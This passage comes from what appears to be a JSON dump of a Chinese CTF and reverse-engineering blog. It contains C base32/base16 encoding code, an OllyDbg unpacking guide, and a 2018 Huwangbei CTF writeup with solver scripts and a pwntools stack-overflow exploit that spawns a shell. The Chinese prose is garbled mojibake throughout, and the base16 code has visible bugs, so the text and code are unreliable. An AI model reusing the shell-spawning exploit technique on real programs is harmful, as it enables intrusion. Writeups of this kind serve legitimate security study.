j]); &#125; if(i == count - 1) &#123; for(j = 0; j &lt; 8; j++) &#123; if(buffer[j] == 0x20) &#123; sign++; &#125; &#125; &#125; res[res_index] = ((buffer[0] &amp; 0x1F) &lt;&lt; 3) | ((buffer[1] &amp; 0x1C) &gt;&gt; 2); if(sign == 4) &#123; break; &#125; res[res_index + 1] = ((buffer[1] &amp; 0x03) &lt;&lt; 6) | ((buffer[2] &amp; 0x1F) &lt;&lt; 1) | ((buffer[3] &amp; 0x10) &gt;&gt; 4); if(sign == 3) &#123; break; &#125; res[res_index + 2] = ((buffer[3] &amp; 0x0F) &lt;&lt; 4) | ((buffer[4] &amp; 0x1E) &gt;&gt; 1); if(sign == 2) &#123; break; &#125; res[res_index + 3] = ((buffer[4] &amp; 0x01) &lt;&lt; 7) | ((buffer[5] &amp; 0x1F) &lt;&lt; 2) | ((buffer[6] &amp; 0x18) &gt;&gt; 3); if(sign == 1) &#123; break; &#125; res[res_index + 4] = ((buffer[6] &amp; 0x07) &lt;&lt; 5) | (buffer[7] &amp; 0x1F); &#125; return res;&#125;int main() &#123; unsigned char s1[MAX]; scanf(\"%s\", s1); unsigned char *s2 = base32_encode((const char *)s1, strlen((const char *)s1)); printf(\"%s\\n\", s2); unsigned char *s3 = base32_decode((const char *)s2, strlen((const char *)s2)); printf(\"%s\\n\", s3); free(s2); free(s3); return 0;&#125; Base16åŠ è§£å¯†å®ç°Base16ç¼–ç ä½¿ç”¨16ä¸ªASCIIå¯æ‰“å°å­—ç¬¦ï¼ˆæ•°å­—0-9å’Œå­—æ¯A-Fï¼‰å¯¹ä»»æ„å­—èŠ‚æ•°æ®è¿›è¡Œç¼–ç ã€‚Base16å…ˆè·å–è¾“å…¥å­—ç¬¦ä¸²æ¯ä¸ªå­—èŠ‚çš„äºŒè¿›åˆ¶å€¼ï¼ˆä¸è¶³8æ¯”ç‰¹åœ¨é«˜ä½è¡¥0ï¼‰ï¼Œç„¶åå°†å…¶ä¸²è”è¿›æ¥ï¼Œå†æŒ‰ç…§4æ¯”ç‰¹ä¸€ç»„è¿›è¡Œåˆ‡åˆ†ï¼Œå°†æ¯ç»„äºŒè¿›åˆ¶æ•°åˆ†åˆ«è½¬æ¢æˆåè¿›åˆ¶ï¼Œåœ¨ä¸‹è¿°è¡¨æ ¼ä¸­æ‰¾åˆ°å¯¹åº”çš„ç¼–ç ä¸²æ¥èµ·æ¥å°±æ˜¯Base16ç¼–ç ã€‚å¯ä»¥çœ‹åˆ°8æ¯”ç‰¹æ•°æ®æŒ‰ç…§4æ¯”ç‰¹åˆ‡åˆ†åˆšå¥½æ˜¯ä¸¤ç»„ï¼Œæ‰€ä»¥Base16ä¸å¯èƒ½ç”¨åˆ°å¡«å……ç¬¦å·â€œ=â€ã€‚ ç®€å•æ¥è¯´ï¼ŒBase16ç¼–ç æ˜¯ä¸€ä¸ªæ ‡å‡†çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118#include&lt;cstdio&gt;#include&lt;cstdlib&gt;#include&lt;cstring&gt;#define MAX 100const char *base16payload = \"0123456789ABCDEF=\";int find_pos(char c) &#123; for(int i = 0; i &lt; 15; i++) &#123; if(c == base16payload[i]) &#123; return i; &#125; &#125; return -1;&#125;unsigned char *base16_encode(const char *s, const int len) &#123; unsigned int sign = len % 4; unsigned int res_len = len * 2; unsigned int i = 0, j = 0; unsigned char *res = (unsigned char *)malloc(res_len + 1); memset(res, 0, res_len + 1); for(i = 0, j = 0; i &lt; len; i += 4, j += 8) &#123; if(i + 4 &gt;= len) &#123; res[j] = (s[i] &gt;&gt; 4) &amp; 0x0F; if(sign == 1) &#123; res[j + 1] = s[i] &amp; 0x0F; res[j + 2] = 0x10; res[j + 3] = 0x10; res[j + 4] = 0x10; res[j + 5] = 0x10; res[j + 6] = 0x10; res[j + 7] = 0x10; break; &#125; else if(sign == 2) &#123; res[j + 1] = s[i] &amp; 0x0F; res[j + 2] = (s[i + 1] &gt;&gt; 4) &amp; 0x0F; res[j + 3] = s[i + 1] &amp; 0x0F; res[j + 4] = 0x10; res[j + 5] = 0x10; res[j + 6] = 0x10; res[j + 7] = 0x10; break; &#125; else if(sign == 3) &#123; res[j + 1] = s[i] &amp; 0x0F; res[j + 2] = (s[i + 1] &gt;&gt; 4) &amp; 0x0F; res[j + 3] = s[i + 1] &amp; 0x0F; res[j + 4] = (s[i + 2] &gt;&gt; 4) &amp; 0x0F; res[j + 5] = s[i + 2] &amp; 0x0F; res[j + 6] = 0x10; res[j + 7] = 0x10; break; &#125; &#125; res[j] = (s[i] &gt;&gt; 4) &amp; 0x0F; res[j + 1] = s[i] &amp; 0x0F; res[j + 2] = (s[i + 1] &gt;&gt; 4) &amp; 0x0F; res[j + 3] = s[i + 1] &amp; 0x0F; res[j + 4] = (s[i + 2] &gt;&gt; 4) &amp; 0x0F; res[j + 5] = s[i + 2] &amp; 0x0F; res[j + 6] = (s[i + 3] &gt;&gt; 4) &amp; 0x0F; res[j + 7] = s[i + 3] &amp; 0x0F; &#125; for(j = 0; j &lt; res_len; j++) &#123; res[j] = base16payload[res[j]]; &#125; return res;&#125;unsigned char *base16_decode(const char *s, const int len) &#123; unsigned int res_len = len / 2; unsigned int i = 0, j = 0; unsigned char *res = (unsigned char *)malloc(res_len + 1); memset(res, 0, res_len + 1); int count = len / 8; for(i = 0; i &lt; count; i++) &#123; int s_index = i * 8; int res_index = i * 4; int buffer[8]; for(j = 0; j &lt; 8; j++) &#123; buffer[j] = find_pos(s[s_index + j]); &#125; int sign; if(i == count - 1) &#123; for(j = 0; j &lt; 8; j++) &#123; if(buffer[j] == 0x10) &#123; sign++; &#125; &#125; &#125; res[res_index] = ((buffer[0] &amp; 0x0F) &lt;&lt; 4) | (buffer[1] &amp; 0x0F); if(sign == 3) &#123; break; &#125; res[res_index + 1] = ((buffer[2] &amp; 0x0F) &lt;&lt; 4) | (buffer[3] &amp; 0x0F); if(sign == 2) &#123; break; &#125; res[res_index + 2] = ((buffer[4] &amp; 0x0F) &lt;&lt; 4) | (buffer[5] &amp; 0x0F); if(sign == 1) &#123; break; &#125; res[res_index + 3] = ((buffer[6] &amp; 0x0F) &lt;&lt; 4) | (buffer[7] &amp; 0x0F); &#125; return res;&#125;int main() &#123; unsigned char s1[MAX]; scanf(\"%s\", s1); unsigned char *s2 = base16_encode((const char *)s1, strlen((const char *)s1)); printf(\"%s\\n\", s2); unsigned char *s3 = base16_decode((const char *)s2, strlen((const char *)s2)); printf(\"%s\\n\", s3); free(s2); free(s3); return 0;&#125;","categories":[],"tags":[{"name":"crypto","slug":"crypto","permalink":"https://qianfei11.github.io/tags/crypto/"},{"name":"c","slug":"c","permalink":"https://qianfei11.github.io/tags/c/"}]},{"title":"è„±å£³æŒ‡å—","slug":"ã€æœªå®Œæˆã€‘è„±å£³æŒ‡å—","date":"2018-11-29T09:04:10.000Z","updated":"2019-02-18T09:09:41.427Z","comments":true,"path":"2018/11/29/ã€æœªå®Œæˆã€‘è„±å£³æŒ‡å—/","link":"","permalink":"https://qianfei11.github.io/2018/11/29/ã€æœªå®Œæˆã€‘è„±å£³æŒ‡å—/","excerpt":"è®°å½•ä¸€ä¸‹è„±ä¸€äº›ç®€å•å£³çš„è¿‡ç¨‹ï¼ˆä¸»è¦æ˜¯æ‰¾OEPï¼‰ã€‚","text":"è®°å½•ä¸€ä¸‹è„±ä¸€äº›ç®€å•å£³çš„è¿‡ç¨‹ï¼ˆä¸»è¦æ˜¯æ‰¾OEPï¼‰ã€‚ ä½¿ç”¨å·¥å…· è°ƒè¯•å·¥å…·ï¼šOllydbg æŸ¥å£³å·¥å…·ï¼šExeInfo/PEID è„±å£³å·¥å…·ï¼šLordPEã€ImportRE ODå¿«æ·é”®ï¼š å¿«æ·é”® åŠŸèƒ½ f7 å•æ­¥æ­¥å…¥ f8 å•æ­¥æ­¥è¿‡ f4 è¿è¡Œåˆ°é€‰å®šä½ç½® f2 è®¾ç½®æ–­ç‚¹ ctrl+f2 é‡æ–°å¼€å§‹ f9 è¿è¡Œ shift+f9 å¿½ç•¥å¼‚å¸¸è¿è¡Œ alt+f9 æ‰§è¡Œåˆ°ç”¨æˆ·ä»£ç  è„±å£³LordPELordPEç”¨æ¥å°†ç¨‹åºdumpå‡ºæ¥ï¼š æ‰¾åˆ°ç¨‹åºå³é”®ï¼Œä¿®æ­£é•œåƒå¤§å°ï¼› å®Œæ•´è½¬å­˜ã€‚ ImportRECImportRECç”¨æ¥ä¿®æ”¹OEPå’Œä¸€äº›IATï¼š æ‰¾åˆ°ç¨‹åºï¼Œè¾“å…¥æ‰¾åˆ°çš„OEPçš„å€¼ï¼› ç‚¹å‡»IATè‡ªåŠ¨æœç´¢ï¼› è·å–å¯¼å…¥è¡¨ï¼› æ˜¾ç¤ºæ— æ•ˆçš„ï¼Œå¦‚æœæœ‰æ— æ•ˆçš„è¡¨æ¸…é™¤å³å¯ï¼› ä¿®æ­£è½¬å‚¨ã€‚ äº†è§£äº†è„±å£³çš„æ–¹æ³•åï¼Œæˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯æ‰¾åˆ°OEPã€‚ å‹ç¼©å£³å‹ç¼©å£³çš„ç‰¹ç‚¹æ˜¯å‡å°è½¯ä»¶ä½“ç§¯å¤§å°ï¼Œä¸»è¦ç›®çš„èµ·å¯¹è½¯ä»¶çš„å‹ç¼©ï¼ŒåŠ å¯†ä¿æŠ¤ä¸æ˜¯é‡ç‚¹ã€‚ä¾‹å¦‚ï¼šUPXã€ASPackç­‰ç­‰ã€‚ UPXï¼ˆthe Ultimate Packer for eXecutablesï¼‰æ˜¯ä¸€ä¸ªå…è´¹ä¸”å¼€æºçš„å¯æ‰§è¡Œç¨‹åºæ–‡ä»¶åŠ å£³å™¨ï¼Œæ”¯æŒè®¸å¤šä¸åŒæ“ä½œç³»ç»Ÿä¸‹çš„å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼ã€‚ ASPackæ˜¯ä¸€ç§å¯å‹ç¼©32ä½WindowsEXEæ–‡ä»¶ä¸DLLæ–‡ä»¶çš„å‹ç¼©å·¥å…·ï¼Œèƒ½å°†å¤§å¤šæ•°EXEæ–‡ä»¶åŠDLLæ–‡ä»¶å¹³å‡å‹ç¼©ç™¾åˆ†ä¹‹ä¸‰ååˆ°å››åçš„å‹ç¼©ç‡ã€‚ kkrunchyæ˜¯ä¸€ä¸ª64K Demoä¸“ç”¨çš„å‹ç¼©å·¥å…·ï¼Œå‹ç¼©ç‡éå¸¸é«˜ã€‚ NSPackæ˜¯ä¸€æ¬¾æ”¯æŒEXE/DLL/OCX/SCRç­‰ç±»å‹çš„æ–‡ä»¶è¿›è¡Œå‹ç¼©ã€‚å¯ä»¥å…¼å®¹64ä½æ“ä½œç³»ç»Ÿã€‚ PECompactæ˜¯ä¸€æ¬¾èƒ½å‹ç¼©å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆåç¼€ä¸ºEXEï¼‰çš„å‹ç¼©åŠ å£³å·¥å…·ï¼Œå‹ç¼©ç‡æé«˜ï¼Œå‹ç¼©åçš„ç¨‹åºæ— éœ€è§£å‹å³å¯ç›´æ¥è¿è¡Œï¼Œé€šè¿‡å‹ç¼©ä»£ç ã€æ•°æ®ã€ç›¸å…³èµ„æºä½¿å‹ç¼©èƒ½è¾¾åˆ°100%ã€‚ å•æ­¥æ‰§è¡Œæ³•ä»¥UPXä¸ºä¾‹ã€‚å•æ­¥æ‰§è¡Œæ³•ï¼Œé€šè¿‡å•æ­¥æ‰§è¡Œä¸€æ­¥ä¸€æ­¥ï¼Œæ‰¾åˆ°OEPï¼ˆç¨‹åºå…¥å£ç‚¹ï¼‰ã€‚å¦‚æœé‡åˆ°å‘ä¸‹çš„è·³è½¬åˆ™é»˜è®¤è·³è½¬ï¼š é‡åˆ°å‘ä¸Šçš„è·³è½¬åˆ™ç›´æ¥æ‰§è¡Œåˆ°ä¸‹ä¸€æ¡è¯­å¥ï¼Œå³f4ï¼š æœ€åæ‰§è¡Œåˆ°popadå¤„ä¼šæœ‰ä¸€ä¸ªå¤§èŒƒå›´çš„jmpï¼Œå³è½¬åˆ°OEPã€‚ ESPå®šå¾‹æ³•ä»¥UPXä¸ºä¾‹ã€‚åˆ©ç”¨å‹ç¼©å‰åESPä¸å˜çš„å®šå¾‹ã€‚åœ¨æŒ‡ä»¤pushadæ—¶å•æ­¥ä¸€ä¸‹ï¼Œä¼šå‘ç°å¯„å­˜å™¨ä¸­åªæœ‰ESPå‘ç”Ÿå˜åŒ–ï¼š ç„¶åå³é”®ESPçš„å€¼ï¼Œè·Ÿéšæ•°æ®çª—å£ï¼š \bå†åœ¨æ•°æ®çª—å£ä¸­ç¡¬ä»¶è®¿é—®ï¼Œè®¾ä¸‹æ–­ç‚¹ï¼š åŒæ ·ä¹Ÿå¯ä»¥é€šè¿‡dd xxxxxxxxæˆ–è€…hr xxxxxxxxè®¾ä¸‹ç¡¬ä»¶æ–­ç‚¹ï¼Œåœ¨ä¸‹æ–¹commandå¤„è¾“å…¥ï¼š ç„¶åf9ç»§ç»­æ‰§è¡Œåˆ°popadåï¼Œåˆ å»ç¡¬ä»¶æ–­ç‚¹ï¼š f7åˆ°è¾¾OEPã€‚ ç‰¹æ®Šçš„ESPå®šå¾‹æ³•ä»¥FSG2.0ä¸ºä¾‹ã€‚ä¸éµå¾ªESPä¸å˜çš„å®šå¾‹ï¼ŒFSG2.0ä¸“ç”¨çš„æ–¹æ³•ã€‚å•æ­¥èµ°åˆ°popadçš„ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œè§‚å¯Ÿå †æ ˆçª—å£ä»ä¸Šå¾€ä¸‹æ•°ç¬¬å››ä¸ªåœ°å€çš„å€¼å³ä¸ºOEPçš„åœ°å€ã€‚å³é”®åœ¨åæ±‡ç¼–çª—å£è·Ÿéšï¼š ä¸‹ç¡¬ä»¶æ–­ç‚¹åf9è¿è¡Œï¼Œåˆ°è¾¾OEPã€‚ äºŒæ¬¡å†…å­˜é•œåƒæ³•ä»¥UPXä¸ºä¾‹ã€‚è¿›å…¥å†…å­˜æ®µä¸­ï¼Œå…ˆæ‰¾åˆ°ç¨‹åºæ®µçš„ç¬¬ä¸€ä¸ª.rsrcï¼Œå¹¶è®¾ä¸‹æ–­ç‚¹åæ‰§è¡Œï¼š å†åœ¨å†…å­˜æ®µä¸­çš„0x00401000å¤„è®¾ä¸‹æ–­ç‚¹ï¼Œå†æ‰§è¡Œ ç„¶åæŒ‰ç…§å•æ­¥æ‰§è¡Œæ³•å¾€ä¸‹èµ°å°±èƒ½çœ‹åˆ°popadè¿˜æœ‰jmpï¼š ä¸€æ­¥ç›´è¾¾æ³•ä»¥UPXä¸ºä¾‹ã€‚åœ¨é‡åˆ°æŒ‡ä»¤pushadåï¼Œé€šè¿‡ç»éªŒå¯ä»¥åˆ¤æ–­å¿…å­˜åœ¨popadï¼Œç›´æ¥æœç´¢æŒ‡ä»¤æ‰¾åˆ°OEPï¼š æ¨¡æ‹Ÿè·Ÿè¸ªæ³•ä»¥ASPackä¸ºä¾‹ã€‚å…ˆè¿›å…¥å†…å­˜ä¸­ï¼Œæ‰¾åˆ°SFXï¼š åœ¨å‘½ä»¤æ¡†è¾“å…¥tc eip&lt;xxxxxxxxï¼š ä¼šçœ‹åˆ°ODå·¦ä¸Šè§’å˜æˆäº†è·Ÿè¸ªï¼š ç­‰å¾…ä¸€æ®µæ—¶é—´å°±ä¼šè·³è½¬åˆ°OEPã€‚ SFXæ¨¡æ‹Ÿè·Ÿè¸ªæ³•ä»¥ASPackä¸ºä¾‹ã€‚è¿›å…¥é€‰é¡¹-&gt;è°ƒè¯•è®¾ç½®ï¼ˆAlt+Oï¼‰ï¼š ä¸€èˆ¬æƒ…å†µé€‰æ‹©å—æ–¹å¼è·Ÿè¸ªæˆ–è€…å­—èŠ‚æ–¹å¼ï¼Œè¿™é‡Œé€‰æ‹©å‰è€…ï¼š ç¡®å®šåï¼Œé‡æ–°è½½å…¥ï¼ˆCtrl+f2ï¼‰ï¼Œç›´æ¥è·³åˆ°äº†OEPã€‚ æœ€åä¸€æ¬¡å¼‚å¸¸æ³•ä»¥PECompactä¸ºä¾‹ã€‚å…ˆåœ¨è°ƒè¯•é€‰é¡¹ä¸­å¿½ç•¥æ‰€æœ‰å¼‚å¸¸ï¼š é‡æ–°è½½å…¥åï¼Œæ‰§è¡Œmæ¬¡shift+f9ï¼Œç›´åˆ°ç¨‹åºè·‘é£ã€‚ç„¶åé‡æ–°è½½å…¥ç¨‹åºï¼Œæ‰§è¡Œm-1æ¬¡shift+f9ã€‚åœ¨å †æ ˆçª—å£ä¸­æ‰¾åˆ°SEå¥æŸ„ï¼Œç„¶åctrl+gè½¬åˆ°SEå¥æŸ„ï¼š 1234567891011120045DE74 B8 F9CB45F0 mov eax,0xF045CBF90045DE79 8D88 9E120010 lea ecx,dword ptr ds:[eax+0x1000129E]0045DE7F 8941 01 mov dword ptr ds:[ecx+0x1],eax0045DE82 8B5424 04 mov edx,dword ptr ss:[esp+0x4]0045DE86 8B52 0C mov edx,dword ptr ds:[edx+0xC]0045DE89 C602 E9 mov byte ptr ds:[edx],0xE90045DE8C 83C2 05 add edx,0x50045DE8F 2BCA sub ecx,edx ; ntdll_1.7720353D0045DE91 894A FC mov dword ptr ds:[edx-0x4],ecx ; qqspirit.0045DE740045DE94 33C0 xor eax,eax0045DE96 C3 retn0045DE97 B8 78563412 mov eax,0x12345678 ; ä¸‹æ–­ç‚¹ éšåæ‰§è¡Œåˆ°æ–­ç‚¹å¤„ï¼Œå•æ­¥è·Ÿåˆ°OEPã€‚ åŠ å¯†å£³åŠ å¯†å£³ä¸»è¦å°±æ˜¯é’ˆå¯¹è½¯ä»¶çš„åŠ å¯†ä¿æŠ¤ï¼Œä¹Ÿæœ‰ä¸€äº›äººç”¨åŠ å¯†å£³æ¥åšä¸€äº›æœ¨é©¬çš„å…æ€ï¼Œå¯¼è‡´ä¸€äº›æ€è½¯ä»¶æŸ¥åˆ°è¯¥å£³å°±è¯¯æŠ¥ç—…æ¯’ã€‚åŠ å¯†å£³çš„ç§ç±»æœ‰å¾ˆå¤šï¼Œå¦‚æœæ‰‹å·¥è„±å’Œä¿®å¤ï¼Œå³ä½¿å¯¹é«˜æ‰‹æ¥è„±ï¼Œä¹Ÿéœ€è¦è´¹å¾ˆå¤§åŠ›æ°”ã€‚ ä¿®å¤æœ‰æ—¶å€™è„±å®Œå£³å´ä¸èƒ½è¿è¡Œç¨‹åºï¼Œéœ€è¦ä¿®å¤IATã€‚é¦–å…ˆè½½å…¥ODï¼Œåœ¨OEPå¾€ä¸‹æ‰¾callï¼š æ‰¾åˆ°ååœ¨å‘½ä»¤æ¡†å¤„è¾“å…¥d xxxxxxï¼š åœ¨æ•°æ®çª—å£ä¸­ï¼Œå¾€ä¸ŠæŸ¥æ‰¾ï¼Œç›´åˆ°æ•°æ®ä¸º0ï¼Œè®°å½•ä¸‹IATåœ°å€ï¼›å¾€ä¸‹ä¹ŸåŒæ ·ï¼š åœ¨ImportRECä¸­ä¿®æ”¹OEPåï¼Œä¸é‡‡å–è‡ªåŠ¨è·å–çš„æ–¹å¼ï¼Œæ‰‹åŠ¨è¾“å…¥IATèµ·å§‹åœ°å€å’Œå¤§å°ï¼Œå·æ‡’çš„åŠæ³•æ˜¯å¤§å°ç›´æ¥è¾“1000ï¼š ç„¶åæ¸…é™¤æ‰æ— æ•ˆçš„ï¼Œè½¬å‚¨ä¸€ä¸‹å¾—åˆ°å®Œæ•´ç¨‹åºã€‚ å‚è€ƒç½‘ç«™https://www.cnblogs.com/hongyuyingxiao/p/9630173.htmlhttps://findream.github.io/2018/07/15/%E5%B8%B8%E8%A7%81%E5%A3%B3%E7%9A%84%E8%84%B1%E5%A3%B3%E6%80%9D%E8%B7%AF/","categories":[],"tags":[{"name":"re","slug":"re","permalink":"https://qianfei11.github.io/tags/re/"}]},{"title":"2018-æŠ¤ç½‘æ¯-review","slug":"2018-æŠ¤ç½‘æ¯-review","date":"2018-10-16T10:18:29.000Z","updated":"2019-01-26T13:24:28.190Z","comments":true,"path":"2018/10/16/2018-æŠ¤ç½‘æ¯-review/","link":"","permalink":"https://qianfei11.github.io/2018/10/16/2018-æŠ¤ç½‘æ¯-review/","excerpt":"çœ‹ç€å¤§ä½¬ä»¬çš„wpå¤ç°ä¸€æ³¢ã€‚","text":"çœ‹ç€å¤§ä½¬ä»¬çš„wpå¤ç°ä¸€æ³¢ã€‚ è¿Ÿåˆ°çš„ç­¾åˆ°é¢˜å……åˆ†è¯æ˜äº†è‡ªå·±æ˜¯ä¸ªç­¾åˆ°é¢˜é€‰æ‰‹ã€‚ 12345678910import base64enc = ''enc = base64.b64decode(enc)# test = 'flag&#123;'# for i in range(len(test)):# print chr(ord(test) ^ ord(enc)),flag = ''for i in range(len(enc)): flag += chr(ord(enc[i]) ^ ord('f'))print flag FEZç»™å‡ºäº†ä¸€ä¸ªpyå®ç°çš„åŠ å¯†ç®—æ³•ï¼Œå’Œä¸€ä¸ªè¢«åŠ å¯†åè¾“å‡ºçš„logã€‚äº†è§£ä¸€ä¸‹ä¹‹åï¼Œå¤§æ¦‚æ˜¯è²æ–¯ç‰¹å°”(Feistel)å¯†ç ï¼Œä¹Ÿå°±æ˜¯DESã€‚ åˆ†æä¸€ä¸‹ï¼Œå¯ä»¥å‘ç°æ¯”è¾ƒéš¾çš„ç‚¹æ˜¯ä¸­é—´çš„å¤šæ¬¡ç¹ççš„å¼‚æˆ–ï¼Œé€†å‘å®ç°è¾ƒéš¾ã€‚é€šè¿‡æ­£å‘åˆ†æåŠ å¯†çš„è¿‡ç¨‹æ¥è§‚å¯Ÿã€‚ 12345678910111213// lå³å·¦åŠéƒ¨åˆ†ï¼Œrå³å³åŠéƒ¨åˆ† l + r1. r + r^l^k12. r^l^k1 + r^l^k1^r^k2 =&gt; r^l^k1 + l^k1^k23. l^k1^k2 + l^k1^k2^r^l^k1^k3 =&gt; l^k1^k2 + r^k2^k34. r^k2^k3 + r^k2^k3^l^k1^k2^k4 =&gt; r^k2^k3 + r^l^k1^k3^k45. r^l^k1^k3^k4 + r^l^k1^k3^k4^r^k2^k3^k5 =&gt; r^l^k1^k3^k4 + l^k1^k2^k4^k56. l^k1^k2^k4^k5 + l^k1^k2^k4^k5^r^l^k1^k3^k4^k6 =&gt; l^k1^k2^k4^k5 + r^k2^k3^k5^k67. r^k2^k3^k5^k6 + r^k2^k3^k5^k6^l^k1^k2^k4^k5^k7 =&gt; r^k2^k3^k5^k6 + r^l^k1^k3^k4^k6^k7// å¯¹äºmå’Œtestæ¥è¯´æ˜¯ä¸€æ ·çš„enc1 = xor(test, k) = t_r^k2^k3^k5^k6 + t_r^t_l^k1^k3^k4^k6^k7enc2 = xor(m, k) = m_r^k2^k3^k5^k6 + m_r^m_l^k1^k3^k4^k6^k7 ç”±äºtestçš„å€¼æ˜¯å·²çŸ¥çš„ï¼Œå¯ä»¥å…ˆåˆ©ç”¨testçš„å·¦å³ä¸¤éƒ¨åˆ†æ±‚å‡ºk2356å’Œk13467ã€‚ç„¶åå†åˆ©ç”¨è¿™ä¸¤ä¸ªæ•°æ±‚å‡ºmçš„å·¦å³ä¸¤éƒ¨åˆ†ï¼Œmä¸­å°±å«æœ‰flagã€‚è„šæœ¬å¦‚ä¸‹ï¼š 12345678910111213141516171819202122def xor(a,b): assert len(a)==len(b) c=\"\" for i in range(len(a)): c+=chr(ord(a[i])^ord(b[i])) return ctest = '8664f7f564f097907c082328ebcdc95e8dc37eec3827fd9c93cc84ebb517c5e396c19d12e730ee3f3fb9e84110f9c92b29ddeab60797'enc1 = '4b4ce14cdb9ace2c678b9a64892cc9d5f2a61e7e2dc256877f2fb454c4d37760278640ab1737c62ba4a403acb14a893facfc1819b259'enc2 = 'd4c898ee5f6b68d6120bd7fb11f5cf4d0431324c40e0b3a6ae9fbd1f17295be643c45ec7f306063dd1009ae5d62b0803c7909629aba7't_l = test.decode('hex')[:27]t_r = test.decode('hex')[27:]k2356 = xor(enc1.decode('hex')[:27], t_r)k13467 = xor(xor(enc1.decode('hex')[27:], t_r), t_l)m_r = xor(enc2.decode('hex')[:27], k2356)m_l = xor(xor(enc2.decode('hex')[27:], m_r), k13467)flag = m_l + m_rprint flag GETTINGSTARTæ‹¿åˆ°é¢˜ç›®è·‘äº†ä¸€ä¸‹ï¼Œç„¶åchecksecçœ‹çœ‹å¼€äº†ä»€ä¹ˆä¿æŠ¤ï¼š 1234567qianfei@qianfeideMacBook-Air ~/ti/2018 huwangbei/GETTINGSTART checksec task_gettingStart_ktQeERc[*] &apos;/Users/qianfei/ti/2018 huwangbei/GETTINGSTART/task_gettingStart_ktQeERc&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled æ‹–è¿›idaé‡Œçœ‹ä¸€çœ‹ï¼Œå°±æ˜¯å¾ˆæ˜æ˜¾çš„æ ˆæº¢å‡ºï¼š 12345678910111213141516171819202122232425262728293031__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; __int64 buf; // [rsp+10h] [rbp-30h] __int64 v5; // [rsp+18h] [rbp-28h] __int64 v6; // [rsp+20h] [rbp-20h] __int64 v7; // [rsp+28h] [rbp-18h] double v8; // [rsp+30h] [rbp-10h] unsigned __int64 v9; // [rsp+38h] [rbp-8h] v9 = __readfsqword(0x28u); buf = 0LL; v5 = 0LL; v6 = 0LL; v7 = 0x7FFFFFFFFFFFFFFFLL; v8 = 1.797693134862316e308; setvbuf(_bss_start, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); printf(\"HuWangBei CTF 2018 will be getting start after %lu seconds...\\n\", 0LL, 1.797693134862316e308); puts(\"But Whether it starts depends on you.\"); read(0, &amp;buf, 0x28uLL); if ( v7 != 0x7FFFFFFFFFFFFFFFLL || v8 != 0.1 ) &#123; puts(\"Try again!\"); &#125; else &#123; printf(\"HuWangBei CTF 2018 will be getting start after %g seconds...\\n\", &amp;buf, v8); system(\"/bin/sh\"); &#125; return 0LL;&#125; bufå’Œv7è¿˜æœ‰v8ä¹‹é—´çš„ç›¸å¯¹ä½ç½®ä¹Ÿæ¯”è¾ƒæ¸…æ¥šï¼Œä¸»è¦å°±æ˜¯è§£å†³doubleçš„0.1åœ¨å†…å­˜ä¸­å­˜å‚¨æ˜¯ä»€ä¹ˆæ ·å­çš„ã€‚é€šè¿‡å†™ä¸€ä¸ªå°çš„cç¨‹åºå¾—åˆ°ç»“æœï¼š 12345678#include &lt;stdio.h&gt;int main() &#123; double x = 0.1; long long n = *(long long*)&amp;x; printf(\"%llX\", n); return 0;&#125; è¾“å‡ºç»“æœä¸º0x3FB999999999999Aï¼Œä¹Ÿå°±æ˜¯-1çš„å€¼ã€‚expå¦‚ä¸‹ï¼š 12345678from pwn import *p = process('./task1')v7 = 0x7FFFFFFFFFFFFFFFv8 = 0x3FB999999999999Aoffset = 0x28payload = (p64(v7) + p64(v8)).rjust(offset, '\\0')p.sendline(payload)p.interactive() REREREæ­¤å¤„è®°å½•lilacçš„writeup é€šè¿‡æœç´¢å­—ç¬¦ä¸²æ‰¾åˆ°ç¨‹åºæ ¡éªŒä½ç½®ï¼Œåˆ†æè™šè¡¨ä¸­çš„å‡½æ•°ï¼Œå‘ç°è¿™åˆæ˜¯ä¸€ä¸ªè™šæ‹Ÿæœºï¼Œå› æ­¤åªéœ€è¦æŒ‰ç…§å¥—è·¯å°†æ¯ä¸€ä¸ªè™šæ‹Ÿæœºçš„æŒ‡ä»¤åˆ†ææ¸…æ¥šï¼Œæœ€ç»ˆåˆ†æå¾—åˆ°çš„è™šè¡¨æ˜¯è¿™æ ·çš„ï¼š 123456789101112131415161718192021222324252627282930.rdata:004031CC ; const RE::`vftable&apos;.rdata:004031CC ??_7RE@@6B@ dd offset assign_hi ; DATA XREF: sub_4016A0+46â†‘o.rdata:004031D0 dd offset get_par_hi.rdata:004031D4 dd offset inc_ip.rdata:004031D8 dd offset get_par_lo.rdata:004031DC dd offset dec_assign_hi.rdata:004031E0 dd offset add_to_hi.rdata:004031E4 dd offset subs_to_hi.rdata:004031E8 dd offset inc_assign_hi.rdata:004031EC dd offset xor_to_hi.rdata:004031F0 dd offset and_to_hi.rdata:004031F4 dd offset mul_to_hi.rdata:004031F8 dd offset mod_to_hi.rdata:004031FC dd offset push_hi.rdata:00403200 dd offset assign_lo_to_hi.rdata:00403204 dd offset load_to_hi.rdata:00403208 dd offset push.rdata:0040320C dd offset pop.rdata:00403210 dd offset store.rdata:00403214 dd offset j_flag_neg1.rdata:00403218 dd offset j_flag_1.rdata:0040321C dd offset j_not_flag.rdata:00403220 dd offset jmp_bck_cnt.rdata:00403224 dd offset cmp_hi_to_lo.rdata:00403228 dd offset inc_mem_ptr.rdata:0040322C dd offset dec_mem_ptr.rdata:00403230 dd offset xor_block.rdata:00403234 dd offset init_regs.rdata:00403238 dd offset get_res.rdata:0040323C dd offset execute_vm å…¶ä¸­åå­—ä¸­hiè¡¨ç¤ºç›®æ ‡å¯„å­˜å™¨ç¼–å·ï¼Œloè¡¨ç¤ºæºå¯„å­˜å™¨ç¼–å·ï¼Œexecute_vmæ˜¯æ‰§è¡Œè™šæ‹Ÿæœºä»£ç çš„å‡½æ•°ï¼Œæ‰§è¡Œç¨‹åºä¸­ç¡¬ç¼–ç 